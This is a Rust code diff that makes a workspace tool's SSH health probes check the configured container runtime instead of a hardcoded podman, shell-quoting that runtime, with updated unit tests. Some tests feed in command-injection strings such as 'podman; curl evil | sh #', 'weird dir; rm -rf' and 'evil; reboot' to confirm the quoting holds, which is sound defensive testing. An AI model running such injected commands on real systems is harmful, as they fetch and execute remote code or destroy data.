@@ -71,10 +71,13 @@ pub fn mutagen_local() -> Probe {
 /// beside the script so the two can't drift.
 const SERVER_CHECKS: &[(&str, &str)] = &[
     ("mutagen", "mutagen present on the server"),
-    ("podman", "rootless podman is up"),
     ("caddy", "the ws-caddy container is running"),
     ("workspace", "the workspace dir exists and is writable"),
 ];
+
+/// The runtime check isn't in `SERVER_CHECKS` because its detail names the
+/// runtime being probed, which isn't known until the workspace config is read.
+const RUNTIME_CHECK: &str = "runtime";
 
 /// The `dns` check isn't in `SERVER_CHECKS` because it only exists when the
 /// workspace routes at all — with no `domain` there is nothing to resolve, and a
@@ -113,14 +116,21 @@ fn dns_detail(domain: &str, ok: bool) -> String {
 ///
 /// `domain` adds the wildcard-resolution check; `None` (no routing configured)
 /// leaves it out entirely rather than emitting a check that always passes.
-pub fn server_script(workspace_path: &str, domain: Option<&str>) -> String {
+///
+/// `runtime` is the workspace's configured runtime, not a fixed `podman`: probing
+/// a binary the server was never meant to have reports a failure the user can't
+/// act on, and misses the one that is actually broken.
+pub fn server_script(workspace_path: &str, runtime: &str, domain: Option<&str>) -> String {
     let wp = remote::shell_quote(workspace_path);
+    // Shell-quoted: `runtime` comes from a possibly-cloned `.ws.json` and this
+    // runs in the server's shell (same posture as `compose::remote_compose_script`).
+    let rt = remote::shell_quote(runtime);
     let mut lines = vec![
         "command -v mutagen >/dev/null 2>&1 && echo mutagen:ok || echo mutagen:fail".to_string(),
-        "podman info >/dev/null 2>&1 && echo podman:ok || echo podman:fail".to_string(),
+        format!("{rt} info >/dev/null 2>&1 && echo {RUNTIME_CHECK}:ok || echo {RUNTIME_CHECK}:fail"),
         // `-f name=` is an unanchored substring match, so anchor it (`^…$`) —
         // else a stray `ws-caddy-old` would make a stopped ws-caddy read as up.
-        "podman ps -q -f name='^ws-caddy$' -f status=running | grep -q . && echo caddy:ok || echo caddy:fail".to_string(),
+        format!("{rt} ps -q -f name='^ws-caddy$' -f status=running | grep -q . && echo caddy:ok || echo caddy:fail"),
         format!("test -d {wp} && test -w {wp} && echo workspace:ok || echo workspace:fail"),
     ];
     if let Some(d) = domain {
@@ -138,8 +148,13 @@ pub fn server_script(workspace_path: &str, domain: Option<&str>) -> String {
 /// Run the server probes over SSH. Returns the per-check `Probe`s, or `None` when
 /// SSH itself couldn't reach the server (so the caller reports "unreachable"
 /// rather than a wall of failures).
-pub fn server_probes(connection: &str, workspace_path: &str, domain: Option<&str>) -> Option<Vec<Probe>> {
-    let script = server_script(workspace_path, domain);
+pub fn server_probes(
+    connection: &str,
+    workspace_path: &str,
+    runtime: &str,
+    domain: Option<&str>,
+) -> Option<Vec<Probe>> {
+    let script = server_script(workspace_path, runtime, domain);
     let out = remote::ssh_capture(connection, &script)?;
     let results = parse_server(&out);
     // A key missing from the output (older server, partial run) reads as a
@@ -149,6 +164,12 @@ pub fn server_probes(connection: &str, workspace_path: &str, domain: Option<&str
         .iter()
         .map(|(key, desc)| Probe::server(key, verdict(key), *desc))
         .collect();
+    // After `mutagen`, before `caddy` — the order the server is set up in, which
+    // is also the order a failure cascades.
+    probes.insert(
+        1,
+        Probe::server(RUNTIME_CHECK, verdict(RUNTIME_CHECK), format!("{runtime} is up on the server")),
+    );
     if let Some(d) = domain {
         let ok = verdict(DNS_CHECK);
         probes.push(Probe::server(DNS_CHECK, ok, dns_detail(d, ok)));
@@ -177,26 +198,44 @@ mod tests {
 
     #[test]
     fn server_script_is_read_only_and_covers_every_check() {
-        let s = server_script("workspace", None);
+        let s = server_script("workspace", "podman", None);
         assert_read_only(&s);
-        // Every advertised key is probed.
+        // Every advertised key is probed, including the one kept out of the table.
         for (key, _) in SERVER_CHECKS {
             assert!(s.contains(&format!("echo {key}:ok")), "missing probe for {key}: {s}");
         }
+        assert!(s.contains(&format!("echo {RUNTIME_CHECK}:ok")), "missing runtime probe: {s}");
+    }
+
+    /// A docker server must be probed with docker — the old script asked `podman`
+    /// whatever the workspace was configured for, so it reported a failure the
+    /// user couldn't act on while the real runtime went unchecked.
+    #[test]
+    fn server_script_probes_the_configured_runtime() {
+        let s = server_script("workspace", "docker", None);
+        assert!(s.contains("docker info"), "runtime liveness must use the configured runtime: {s}");
+        assert!(s.contains("docker ps -q"), "the caddy check must use it too: {s}");
+        assert!(!s.contains("podman"), "no hardcoded podman may survive: {s}");
+    }
+
+    #[test]
+    fn server_script_quotes_a_hostile_runtime() {
+        let s = server_script("workspace", "podman; curl evil | sh #", None);
+        assert!(s.contains("'podman; curl evil | sh #' info"), "runtime must be shell-quoted: {s}");
     }
 
     #[test]
     fn server_script_quotes_the_workspace_path() {
-        let s = server_script("weird dir; rm -rf", None);
+        let s = server_script("weird dir; rm -rf", "podman", None);
         assert!(s.contains("'weird dir; rm -rf'"), "workspace path must be shell-quoted: {s}");
     }
 
     #[test]
     fn server_script_probes_dns_only_with_a_domain() {
-        let without = server_script("workspace", None);
+        let without = server_script("workspace", "podman", None);
         assert!(!without.contains("dns:"), "no domain must mean no DNS check at all: {without}");
 
-        let with = server_script("workspace", Some("myapp.test"));
+        let with = server_script("workspace", "podman", Some("myapp.test"));
         assert!(with.contains("getent hosts ws-probe.myapp.test"), "expected the wildcard lookup: {with}");
         assert!(with.contains("echo dns:ok"), "expected the dns key: {with}");
         assert!(with.contains("echo dns:fail"), "expected the dns failure branch: {with}");
@@ -206,7 +245,7 @@ mod tests {
 
     #[test]
     fn server_script_quotes_the_domain() {
-        let s = server_script("workspace", Some("evil; reboot"));
+        let s = server_script("workspace", "podman", Some("evil; reboot"));
         assert!(s.contains("'ws-probe.evil; reboot'"), "the probe host must be shell-quoted: {s}");
     }
 
@@ -223,9 +262,9 @@ mod tests {
 
     #[test]
     fn parse_server_reads_ok_and_fail() {
-        let m = parse_server("mutagen:ok\npodman:fail\ncaddy:ok\n");
+        let m = parse_server("mutagen:ok\nruntime:fail\ncaddy:ok\n");
         assert_eq!(m.get("mutagen"), Some(&true));
-        assert_eq!(m.get("podman"), Some(&false));
+        assert_eq!(m.get(RUNTIME_CHECK), Some(&false));
         assert_eq!(m.get("caddy"), Some(&true));
         assert_eq!(m.get("workspace"), None);
     }
@@ -233,7 +272,7 @@ mod tests {
     #[test]
     fn server_probes_default_a_missing_key_to_fail() {
         // Simulate the parse → probe mapping with a partial result set.
-        let results = parse_server("mutagen:ok\npodman:ok\n");
+        let results = parse_server("mutagen:ok\nruntime:ok\n");
         let workspace_ok = results.get("workspace").copied().unwrap_or(false);
         assert!(!workspace_ok, "a key absent from the server output must read as a failure");
     }
